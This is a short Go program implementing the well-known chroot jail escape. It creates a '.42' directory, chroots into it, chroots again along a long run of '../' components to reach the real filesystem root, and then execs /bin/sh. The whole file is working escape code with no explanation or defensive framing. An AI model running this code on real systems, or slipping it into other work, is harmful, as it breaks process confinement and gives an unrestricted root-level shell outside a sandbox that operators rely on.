package main

import (
	"fmt"
	"os"
	"syscall"
)

func main() {
	if _, err := os.Stat(".42"); os.IsNotExist(err) {
		if err := os.Mkdir(".42", 0755); err != nil {
			fmt.Println("Mkdir failed")
		}
	}
	if err := syscall.Chroot(".42"); err != nil {
		fmt.Println("Chroot to .42 failed")
	}
	if err := syscall.Chroot("../../../../../../../../../../../../../../../.."); err != nil {
		fmt.Println("Jail break failed")
	}
	if err := syscall.Exec("/bin/sh", []string{""}, os.Environ()); err != nil {
		fmt.Println(err)
		fmt.Println("Exec failed")
	}
}
